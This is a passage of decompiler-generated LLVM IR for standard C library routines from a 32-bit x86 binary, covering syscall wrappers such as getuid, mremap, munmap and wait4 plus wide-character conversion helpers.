  %v0_8051f49 = phi i32 [ %v9_8051f30, %entry ], [ -1, %dec_label_pc_8051f3c ]
  %v2_8051f4c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051f4c, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051f49

; uselistorder directives
  uselistorder i32 %v9_8051f30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051f48, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f50 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f50, i32* %stack_var_-4, align 4
  %v1_8051f59 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8051f59, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051f59, -4095
  br i1 %tmp, label %dec_label_pc_8051f70, label %dec_label_pc_8051f64

dec_label_pc_8051f64:                             ; preds = %entry
  %v0_8051f64 = load i32, i32* %stack_var_-4, align 4
  %v1_8051f64 = call i32 @__errno_location(i32 %v0_8051f64)
  %v0_8051f69 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051f69 = sub i32 0, %v0_8051f69
  %v2_8051f6b = inttoptr i32 %v1_8051f64 to i32*
  store i32 %v1_8051f69, i32* %v2_8051f6b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051f70

dec_label_pc_8051f70:                             ; preds = %entry, %dec_label_pc_8051f64
  %v0_8051f71 = phi i32 [ %v1_8051f59, %entry ], [ -1, %dec_label_pc_8051f64 ]
  %v2_8051f74 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051f74, i32* @ebx, align 4
  ret i32 %v0_8051f71

; uselistorder directives
  uselistorder i32 %v1_8051f59, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051f70, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f78 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f78, i32* %stack_var_-4, align 4
  %v1_8051f81 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8051f81, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051f81, -4095
  br i1 %tmp, label %dec_label_pc_8051f98, label %dec_label_pc_8051f8c

dec_label_pc_8051f8c:                             ; preds = %entry
  %v0_8051f8c = load i32, i32* %stack_var_-4, align 4
  %v1_8051f8c = call i32 @__errno_location(i32 %v0_8051f8c)
  %v0_8051f91 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051f91 = sub i32 0, %v0_8051f91
  %v2_8051f93 = inttoptr i32 %v1_8051f8c to i32*
  store i32 %v1_8051f91, i32* %v2_8051f93, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051f98

dec_label_pc_8051f98:                             ; preds = %entry, %dec_label_pc_8051f8c
  %v0_8051f99 = phi i32 [ %v1_8051f81, %entry ], [ -1, %dec_label_pc_8051f8c ]
  %v2_8051f9c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051f9c, i32* @ebx, align 4
  ret i32 %v0_8051f99

; uselistorder directives
  uselistorder i32 %v1_8051f81, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051f98, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051fa0 = load i32, i32* @ebx, align 4
  store i32 %v0_8051fa0, i32* %stack_var_-4, align 4
  %v1_8051fa9 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8051fa9, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051fa9, -4095
  br i1 %tmp, label %dec_label_pc_8051fc0, label %dec_label_pc_8051fb4

dec_label_pc_8051fb4:                             ; preds = %entry
  %v0_8051fb4 = load i32, i32* %stack_var_-4, align 4
  %v1_8051fb4 = call i32 @__errno_location(i32 %v0_8051fb4)
  %v0_8051fb9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051fb9 = sub i32 0, %v0_8051fb9
  %v2_8051fbb = inttoptr i32 %v1_8051fb4 to i32*
  store i32 %v1_8051fb9, i32* %v2_8051fbb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051fc0

dec_label_pc_8051fc0:                             ; preds = %entry, %dec_label_pc_8051fb4
  %v0_8051fc1 = phi i32 [ %v1_8051fa9, %entry ], [ -1, %dec_label_pc_8051fb4 ]
  %v2_8051fc4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051fc4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051fc1

; uselistorder directives
  uselistorder i32 %v1_8051fa9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051fc0, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051fc8 = load i32, i32* @ebx, align 4
  store i32 %v0_8051fc8, i32* %stack_var_-4, align 4
  %v1_8051fd1 = call i32 @int80_syscall(i32 199)
  store i32 %v1_8051fd1, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051fd1, -4095
  br i1 %tmp, label %dec_label_pc_8051fe8, label %dec_label_pc_8051fdc

dec_label_pc_8051fdc:                             ; preds = %entry
  %v0_8051fdc = load i32, i32* %stack_var_-4, align 4
  %v1_8051fdc = call i32 @__errno_location(i32 %v0_8051fdc)
  %v0_8051fe1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051fe1 = sub i32 0, %v0_8051fe1
  %v2_8051fe3 = inttoptr i32 %v1_8051fdc to i32*
  store i32 %v1_8051fe1, i32* %v2_8051fe3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051fe8

dec_label_pc_8051fe8:                             ; preds = %entry, %dec_label_pc_8051fdc
  %v0_8051fe9 = phi i32 [ %v1_8051fd1, %entry ], [ -1, %dec_label_pc_8051fdc ]
  %v2_8051fec = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051fec, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051fe9

; uselistorder directives
  uselistorder i32 %v1_8051fd1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051fe8, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051ff0 = load i32, i32* @edi, align 4
  %v0_8051ff1 = load i32, i32* @esi, align 4
  store i32 %v0_8051ff1, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_8052009 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_8052011 = call i32 @mremap(i32 %v0_8052009, i32 %v0_8051ff1, i32 %v0_8051ff0, i32 %tmp6, i32 %arg1, i32 %arg2)
  store i32 %v0_8052009, i32* @ebx, align 4
  store i32 %v6_8052011, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v6_8052011, -4095
  br i1 %tmp, label %dec_label_pc_8052029, label %dec_label_pc_805201d

dec_label_pc_805201d:                             ; preds = %entry
  %v1_805201d = call i32 @__errno_location(i32 %v0_8052009)
  %v0_8052022 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052022 = sub i32 0, %v0_8052022
  %v2_8052024 = inttoptr i32 %v1_805201d to i32*
  store i32 %v1_8052022, i32* %v2_8052024, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052029

dec_label_pc_8052029:                             ; preds = %entry, %dec_label_pc_805201d
  %v0_805202a = phi i32 [ %v6_8052011, %entry ], [ -1, %dec_label_pc_805201d ]
  %v2_8052029 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052029, i32* @edx, align 4
  %v2_805202c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805202c, i32* @esi, align 4
  store i32 %v0_8051ff0, i32* @edi, align 4
  ret i32 %v0_805202a

; uselistorder directives
  uselistorder i32 %v6_8052011, { 1, 0, 2 }
  uselistorder i32 %v0_8052009, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052029, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052030 = load i32, i32* @ebx, align 4
  store i32 %v0_8052030, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8052043 = call i32 @munmap(i32 %v0_8052030, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_8052043, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8052043, -4095
  br i1 %tmp, label %dec_label_pc_805205c, label %dec_label_pc_8052050

dec_label_pc_8052050:                             ; preds = %entry
  %v0_8052050 = load i32, i32* %stack_var_-4, align 4
  %v1_8052050 = call i32 @__errno_location(i32 %v0_8052050)
  %v0_8052055 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052055 = sub i32 0, %v0_8052055
  %v2_8052057 = inttoptr i32 %v1_8052050 to i32*
  store i32 %v1_8052055, i32* %v2_8052057, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805205c

dec_label_pc_805205c:                             ; preds = %entry, %dec_label_pc_8052050
  %v0_805205d = phi i32 [ %v4_8052043, %entry ], [ -1, %dec_label_pc_8052050 ]
  %v2_805205c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805205c, i32* @edx, align 4
  %v2_8052060 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052060, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805205d

; uselistorder directives
  uselistorder i32 %v4_8052043, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805205c, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-4 = alloca i32, align 4
  %v0_8052064 = load i32, i32* @ebx, align 4
  store i32 %v0_8052064, i32* %stack_var_-4, align 4
  %v4_8052068 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_8052068, i32* %ebx.global-to-local, align 4
  %v6_8052077 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_8052077, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v6_8052077, -4095
  br i1 %tmp, label %dec_label_pc_8052090, label %dec_label_pc_8052084

dec_label_pc_8052084:                             ; preds = %entry
  %v0_8052084 = load i32, i32* %stack_var_-4, align 4
  %v1_8052084 = call i32 @__errno_location(i32 %v0_8052084)
  %v0_8052089 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052089 = sub i32 0, %v0_8052089
  %v2_805208b = inttoptr i32 %v1_8052084 to i32*
  store i32 %v1_8052089, i32* %v2_805208b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052090

dec_label_pc_8052090:                             ; preds = %entry, %dec_label_pc_8052084
  %v0_8052091 = phi i32 [ %v6_8052077, %entry ], [ -1, %dec_label_pc_8052084 ]
  %v2_8052094 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052094, i32* @ebx, align 4
  ret i32 %v0_8052091

; uselistorder directives
  uselistorder i32 %v6_8052077, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052090, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8052099 = load i32, i32* @ebx, align 4
  %v0_805209d = load i32, i32* @global_var_8060304.231, align 4
  %v1_805209d = icmp eq i32 %v0_805209d, 0
  %v1_80520a8 = icmp eq i1 %v1_805209d, false
  br i1 %v1_80520a8, label %dec_label_pc_80520bb, label %dec_label_pc_80520aa

dec_label_pc_80520aa:                             ; preds = %entry
  %v1_80520af = call i32 @__GI_brk(i32 0)
  %v2_80520b7 = icmp slt i32 %v1_80520af, 0
  br i1 %v2_80520b7, label %dec_label_pc_80520dd, label %dec_label_pc_80520aa.dec_label_pc_80520bb_crit_edge

dec_label_pc_80520aa.dec_label_pc_80520bb_crit_edge: ; preds = %dec_label_pc_80520aa
  %v0_80520bd.pre = load i32, i32* @global_var_8060304.231, align 4
  br label %dec_label_pc_80520bb

dec_label_pc_80520bb:                             ; preds = %dec_label_pc_80520aa.dec_label_pc_80520bb_crit_edge, %entry
  %v0_80520cb = phi i32 [ %v0_80520bd.pre, %dec_label_pc_80520aa.dec_label_pc_80520bb_crit_edge ], [ %v0_805209d, %entry ]
  %v1_80520bb = icmp eq i32 %arg1, 0
  %v1_80520c2 = icmp eq i1 %v1_80520bb, false
  br i1 %v1_80520c2, label %dec_label_pc_80520c8, label %dec_label_pc_80520c4

dec_label_pc_80520c4:                             ; preds = %dec_label_pc_80520bb
  br label %dec_label_pc_80520e0

dec_label_pc_80520c8:                             ; preds = %dec_label_pc_80520bb
  store i32 %v0_80520cb, i32* @ebx, align 4
  %v2_80520cd = add i32 %v0_80520cb, %arg1
  %v1_80520d1 = call i32 @__GI_brk(i32 %v2_80520cd)
  %v2_80520d9 = icmp slt i32 %v1_80520d1, 0
  %v1_80520db = icmp eq i1 %v2_80520d9, false
  br i1 %v1_80520db, label %dec_label_pc_80520c8.dec_label_pc_80520e0_crit_edge, label %dec_label_pc_80520dd

dec_label_pc_80520c8.dec_label_pc_80520e0_crit_edge: ; preds = %dec_label_pc_80520c8
  %v0_80520e1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80520e0

dec_label_pc_80520dd:                             ; preds = %dec_label_pc_80520c8, %dec_label_pc_80520aa
  br label %dec_label_pc_80520e0

dec_label_pc_80520e0:                             ; preds = %dec_label_pc_80520c8.dec_label_pc_80520e0_crit_edge, %dec_label_pc_80520c4, %dec_label_pc_80520dd
  %v0_80520e1 = phi i32 [ %v0_80520e1.pre, %dec_label_pc_80520c8.dec_label_pc_80520e0_crit_edge ], [ %v0_80520cb, %dec_label_pc_80520c4 ], [ -1, %dec_label_pc_80520dd ]
  %v2_80520e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80520e0, i32* @edx, align 4
  store i32 %v0_8052099, i32* @ebx, align 4
  ret i32 %v0_80520e1

; uselistorder directives
  uselistorder i32 %v0_80520cb, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_80520e0, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80520e8 = load i32, i32* @edi, align 4
  %v0_80520e9 = load i32, i32* @esi, align 4
  store i32 %v0_80520e9, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_80520fd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8052105 = call i32 @wait4(i32 %v0_80520fd, i32 %v0_80520e9, i32 %v0_80520e8, i32 %tmp5)
  store i32 %v0_80520fd, i32* @ebx, align 4
  store i32 %v4_8052105, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8052105, -4095
  br i1 %tmp, label %dec_label_pc_805211d, label %dec_label_pc_8052111

dec_label_pc_8052111:                             ; preds = %entry
  %v1_8052111 = call i32 @__errno_location(i32 %v0_80520fd)
  %v0_8052116 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052116 = sub i32 0, %v0_8052116
  %v2_8052118 = inttoptr i32 %v1_8052111 to i32*
  store i32 %v1_8052116, i32* %v2_8052118, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805211d

dec_label_pc_805211d:                             ; preds = %entry, %dec_label_pc_8052111
  %v0_805211e = phi i32 [ %v4_8052105, %entry ], [ -1, %dec_label_pc_8052111 ]
  %v2_8052120 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052120, i32* @esi, align 4
  store i32 %v0_80520e8, i32* @edi, align 4
  ret i32 %v0_805211e

; uselistorder directives
  uselistorder i32 %v4_8052105, { 1, 0, 2 }
  uselistorder i32 %v0_80520fd, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_805211d, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80602e4.232 to i32)
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_8052137 = icmp eq i32 %tmp4, 0
  %v1_8052139 = icmp eq i1 %v1_8052137, false
  br i1 %v1_8052139, label %dec_label_pc_8052141, label %dec_label_pc_805213b

dec_label_pc_805213b:                             ; preds = %entry
  %v2_805213b = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_8052141

dec_label_pc_8052141:                             ; preds = %entry, %dec_label_pc_805213b
  %v0_805215d = phi i32 [ %tmp4, %entry ], [ %v2_805213b, %dec_label_pc_805213b ]
  %v0_8052149 = phi i32 [ %tmp3, %entry ], [ 0, %dec_label_pc_805213b ]
  %v2_8052141 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8052141, i32* %stack_var_-8, align 4
  store i32 %v0_8052149, i32* %stack_var_-4, align 4
  %v2_8052158 = ptrtoint i32* %stack_var_-8 to i32
  %v5_805215e = inttoptr i32 %v0_805215d to i8*
  %v6_805215e = call i32 @__GI_wcsnrtombs(i8* %v5_805215e, i32 %v2_8052158, i32 1, i32 16, i32 %tmp)
  %v1_8052168 = icmp eq i32 %v6_805215e, 0
  %v3_805216a = select i1 %v1_8052168, i32 1, i32 %v6_805215e
  ret i32 %v3_805216a

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8052141, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_8052189 = inttoptr i32 %tmp to i8*
  %v6_8052189 = call i32 @__GI_wcsnrtombs(i8* %v5_8052189, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_8052189
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-32 = alloca i32, align 4
  %v0_8052197 = load i32, i32* @ebx, align 4
  %v4_805219b = ptrtoint i8* %arg1 to i32
  store i32 %v4_805219b, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_80521ab = icmp eq i8* %arg1, null
  store i1 %v1_80521ab, i1* %zf.global-to-local, align 1
  br i1 %v1_80521ab, label %dec_label_pc_80521ba, label %dec_label_pc_80521af

dec_label_pc_80521af:                             ; preds = %entry
  %v12_80521af = icmp eq i32 %v4_805219b, %arg2
  store i1 %v12_80521af, i1* %zf.global-to-local, align 1
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_80521b6 = icmp eq i1 %v12_80521af, false
  br i1 %v1_80521b6, label %dec_label_pc_80521dd, label %dec_label_pc_80521d7

dec_label_pc_80521ba:                             ; preds = %entry
  %v2_80521ba = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80521ba, i32* %edx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80521db

dec_label_pc_80521c3:                             ; preds = %dec_label_pc_80521eb
  %v1_80521c3 = call i32 @__errno_location(i32 %v0_8052197)
  %v1_80521c8 = inttoptr i32 %v1_80521c3 to i32*
  store i32 84, i32* %v1_80521c8, align 4
  br label %dec_label_pc_8052211

dec_label_pc_80521d3:                             ; preds = %dec_label_pc_80521f2
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_8052206.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052202

dec_label_pc_80521d7:                             ; preds = %dec_label_pc_80521af
  %v2_80521d7 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80521d7, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80521db

dec_label_pc_80521db:                             ; preds = %dec_label_pc_80521ba, %dec_label_pc_80521d7
  %v2_80521f416 = phi i32 [ %v2_80521ba, %dec_label_pc_80521ba ], [ %v2_80521d7, %dec_label_pc_80521d7 ]
  %v1_80521e012 = phi i32 [ -1, %dec_label_pc_80521ba ], [ %arg4, %dec_label_pc_80521d7 ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80521dd

dec_label_pc_80521dd:                             ; preds = %dec_label_pc_80521af, %dec_label_pc_80521db
  %v2_80521f415 = phi i32 [ %v4_805219b, %dec_label_pc_80521af ], [ %v2_80521f416, %dec_label_pc_80521db ]
  %v0_80521e2 = phi i32 [ %arg4, %dec_label_pc_80521af ], [ %v1_80521e012, %dec_label_pc_80521db ]
  %v1_80521dd = inttoptr i32 %arg2 to i32*
  %v2_80521dd = load i32, i32* %v1_80521dd, align 4
  store i32 %v2_80521dd, i32* %ebx.global-to-local, align 4
  %tmp31 = icmp uge i32 %v0_80521e2, %arg3
  %v5_80521e4 = select i1 %tmp31, i32 %arg3, i32 %v0_80521e2
  store i32 %v5_80521e4, i32* %edi.global-to-local, align 4
  store i32 %v5_80521e4, i32* @ecx, align 4
  %v1_80521fe3 = icmp eq i32 %v5_80521e4, 0
  store i1 %v1_80521fe3, i1* %zf.global-to-local, align 1
  %v1_805220010 = icmp eq i1 %v1_80521fe3, false
  br i1 %v1_805220010, label %dec_label_pc_80521eb, label %dec_label_pc_8052202

dec_label_pc_80521eb:                             ; preds = %dec_label_pc_80521dd, %dec_label_pc_80521f8
  %v2_80521f4 = phi i32 [ %v2_80521fb, %dec_label_pc_80521f8 ], [ %v2_80521f415, %dec_label_pc_80521dd ]
  %v0_80521eb = phi i32 [ %v1_80521f8, %dec_label_pc_80521f8 ], [ %v2_80521dd, %dec_label_pc_80521dd ]
  %v1_80521eb = inttoptr i32 %v0_80521eb to i32*
  %v2_80521eb = load i32, i32* %v1_80521eb, align 4
  %v9_80521ed = icmp eq i32 %v2_80521eb, 127
  store i1 %v9_80521ed, i1* %zf.global-to-local, align 1
  %v6_80521f0 = icmp ugt i32 %v2_80521eb, 127
  br i1 %v6_80521f0, label %dec_label_pc_80521c3, label %dec_label_pc_80521f2

dec_label_pc_80521f2:                             ; preds = %dec_label_pc_80521eb
  %v3_80521f2 = trunc i32 %v2_80521eb to i8
  %v4_80521f2 = icmp eq i8 %v3_80521f2, 0
  store i1 %v4_80521f2, i1* %zf.global-to-local, align 1
  %v3_80521f4 = inttoptr i32 %v2_80521f4 to i8*
  store i8 %v3_80521f2, i8* %v3_80521f4, align 1
  %v0_80521f6 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80521f6, label %dec_label_pc_80521d3, label %dec_label_pc_80521f8

dec_label_pc_80521f8:                             ; preds = %dec_label_pc_80521f2
  %v0_80521f8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80521f8 = add i32 %v0_80521f8, 4
  store i32 %v1_80521f8, i32* %ebx.global-to-local, align 4
  %v0_80521fb = load i32, i32* %edx.global-to-local, align 4
  %v1_80521fb = load i32, i32* %esi.global-to-local, align 4
  %v2_80521fb = add i32 %v1_80521fb, %v0_80521fb
  store i32 %v2_80521fb, i32* %edx.global-to-local, align 4
  %v0_80521fd = load i32, i32* @ecx, align 4
  %v1_80521fd = add i32 %v0_80521fd, -1
  %v8_80521fd = icmp eq i32 %v1_80521fd, 0
  store i32 %v1_80521fd, i32* @ecx, align 4
  store i1 %v8_80521fd, i1* %zf.global-to-local, align 1
  %v1_8052200 = icmp eq i1 %v8_80521fd, false
  br i1 %v1_8052200, label %dec_label_pc_80521eb, label %dec_label_pc_8052202

dec_label_pc_8052202:                             ; preds = %dec_label_pc_80521f8, %dec_label_pc_80521dd, %dec_label_pc_80521d3
  %v0_805220a = phi i32 [ 0, %dec_label_pc_80521d3 ], [ %v2_80521dd, %dec_label_pc_80521dd ], [ %v1_80521f8, %dec_label_pc_80521f8 ]
  %v0_8052206 = phi i32 [ %v0_8052206.pre, %dec_label_pc_80521d3 ], [ %v2_80521f415, %dec_label_pc_80521dd ], [ %v2_80521fb, %dec_label_pc_80521f8 ]
  %v2_8052202 = ptrtoint i32* %stack_var_-32 to i32
  %v12_8052206 = icmp eq i32 %v0_8052206, %v2_8052202
  store i1 %v12_8052206, i1* %zf.global-to-local, align 1
  br i1 %v12_8052206, label %dec_label_pc_805220d, label %dec_label_pc_805220a

dec_label_pc_805220a:                             ; preds = %dec_label_pc_8052202
  %v1_805220a = load i32, i32* %ebp.global-to-local, align 4
  %v2_805220a = inttoptr i32 %v1_805220a to i32*
  store i32 %v0_805220a, i32* %v2_805220a, align 4
  br label %dec_label_pc_805220d

dec_label_pc_805220d:                             ; preds = %dec_label_pc_8052202, %dec_label_pc_805220a
  %v0_805220d = load i32, i32* %edi.global-to-local, align 4
  %v1_805220f = load i32, i32* @ecx, align 4
  %v2_805220f = sub i32 %v0_805220d, %v1_805220f
  %v12_805220f = icmp eq i32 %v2_805220f, 0
  br label %dec_label_pc_8052211

dec_label_pc_8052211:                             ; preds = %dec_label_pc_80521c3, %dec_label_pc_805220d
  %storemerge = phi i1 [ %v12_805220f, %dec_label_pc_805220d ], [ false, %dec_label_pc_80521c3 ]
  %storemerge1 = phi i32 [ %v2_805220f, %dec_label_pc_805220d ], [ -1, %dec_label_pc_80521c3 ]
  store i1 %storemerge, i1* %zf.global-to-local, align 1
  %v0_8052211 = load i32, i32* @esp, align 4
  %v9_8052211 = icmp eq i32 %v0_8052211, -28
  store i1 %v9_8052211, i1* %zf.global-to-local, align 1
  store i32 %v0_8052197, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i1 %v12_8052206, { 1, 0 }
  uselistorder i32 %v2_80521fb, { 0, 2, 1 }
  uselistorder i32 %v1_80521f8, { 0, 2, 1 }
  uselistorder i32 %v2_80521eb, { 1, 2, 0 }
  uselistorder i32 %v2_80521dd, { 1, 0, 2 }
  uselistorder i32 %v0_80521e2, { 1, 0 }
  uselistorder i32 %v2_80521f415, { 1, 0 }
  uselistorder i1 %v12_80521af, { 1, 0 }
  uselistorder i32 %v4_805219b, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 0, 11, 1, 6, 3, 4, 5, 12, 7, 2, 8, 9, 10 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32 127, { 2, 0, 1, 5, 3, 6, 4 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052211, { 1, 0 }
  uselistorder label %dec_label_pc_805220d, { 1, 0 }
  uselistorder label %dec_label_pc_80521eb, { 1, 0 }
  uselistorder label %dec_label_pc_80521dd, { 1, 0 }
  uselistorder label %dec_label_pc_80521db, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
